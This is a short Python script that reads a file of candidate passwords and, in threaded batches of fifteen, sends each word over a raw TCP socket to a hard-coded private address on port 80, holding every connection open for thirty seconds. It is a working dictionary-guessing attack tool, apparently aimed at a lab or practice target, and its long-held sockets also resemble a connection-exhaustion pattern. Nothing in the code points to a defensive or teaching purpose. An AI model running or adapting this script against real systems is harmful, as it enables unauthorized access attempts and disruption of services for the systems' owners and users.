import itertools
import time

from multiprocessing.dummy import Pool as Threadpool
from os.path import abspath, exists
from socket import *


MIN_DELAY_SECS = 30
MAX_SOCKETS = 15
SERVER_NAME = '10.12.1.244'
SERVER_PORT = 80
DICT_PATH = "passwords"


def main():
    pool = Threadpool(MAX_SOCKETS)

    f_path = abspath(DICT_PATH)
    if exists(f_path):
        with open(DICT_PATH) as f:
            # Yeah, this is a weird one.  zip_longest takes an unpacked list (*list_var) and returns an iterator over it
            # We want n copies of a single list (list_var * n) because we're going to call n copies of the same iter.
            # So we unpack the combination of the cloned lists: zip_longest( *(list_var * n) )
            # This enables us to serialize a single iter.
            # See https://stackoverflow.com/questions/1657299/how-do-i-read-two-lines-from-a-file-at-a-time-using-python
            for words in itertools.zip_longest(*[f]*MAX_SOCKETS, fillvalue="fill"):
                attempts = []

                for w in words:
                    # Default fillvalue=None, which errors if we try to call None.strip(), so we change it to a str type
                    attempts.append(w.strip())

                print("Processing {}".format(attempts))

                # Pool.map(function, list) spawns a thread to run function(l) for l in list.
                pool.map(send_payload, attempts)

        print("\nFinished searching using dictionary file {}!\n".format(f.name))

    else:
        print("\nFailed to find path to 'passwords' file! {}\n".format(DICT_PATH))

    print("Stopping service ...\n")
    time.sleep(MIN_DELAY_SECS)
    print("Service stopped!\n")


def send_payload(payload):
    # Create a TCP client socket
    # (AF_INET is used for IPv4 protocols)
    # (SOCK_STREAM is used for TCP)
    # print("\nPayload: {}\n".format(payload))
    client_socket = socket(AF_INET, SOCK_STREAM)
    client_socket.connect((SERVER_NAME, SERVER_PORT))

    client_socket.send(payload.encode())
    time.sleep(MIN_DELAY_SECS)
    client_socket.close()


# def send_by_byte(output: str, s: socket):
#     for i in range(0, len(output)):
#         s.send(output[i].encode())
#     #s.send('\r\n'.encode())
#
#     return


if __name__ == '__main__':
    main()
